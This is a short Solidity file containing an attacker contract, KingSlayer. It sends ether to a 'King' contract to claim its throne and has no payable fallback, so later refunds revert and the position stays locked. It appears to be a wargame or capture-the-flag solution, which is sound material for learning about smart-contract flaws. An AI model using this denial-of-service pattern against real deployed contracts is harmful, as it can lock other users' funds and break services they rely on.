pragma solidity ^0.4.18;

contract King {
    function () external payable;
}

contract KingSlayer {
    King public king;

    function KingSlayer (address _king) public payable {
        king = King(_king);
    }

    function crownMe () public {
        address(king).call.value(1 ether)();
    }
}